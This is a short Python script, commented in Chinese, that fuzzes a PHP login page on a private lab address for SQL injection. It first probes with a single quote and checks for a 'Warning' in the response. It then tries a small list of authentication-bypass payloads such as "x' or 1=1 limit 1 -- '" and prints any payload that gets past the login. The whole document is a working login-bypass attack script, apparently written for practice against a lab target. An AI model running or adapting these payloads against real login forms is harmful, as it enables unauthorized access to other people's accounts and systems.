#利用python对php的登录页面进行fuzz测试
import requests
def login_fuzz():
    #试探代码，试探是否有sql注入漏洞
    url = 'http://192.168.222.143/security/login.php'
    data = {'username':"'","password":'1321421',"vcode":"0000"}
    resp = requests.post(url=url,data=data)
    # print(resp.text)
    if 'Warning' in resp.text:
        print('疑似存在sql注入漏洞，可以进行测试')
        #该列表可以用一个sql注入的字典
        payload_list = ["x' or id=1","x' or 1=1 limit 1 -- '","x' or userid=1"]
        for payload in payload_list:
            data = {'username':payload,"password":'1321421',"vcode":"0000"}
            resp = requests.post(url=url,data=data)
            if 'login-fail'  not in resp.text:
                print(f'登陆成功,payload为:{payload}')
    else:
        print('本次试探未发现sql注入漏洞')

if __name__ == '__main__':
    login_fuzz()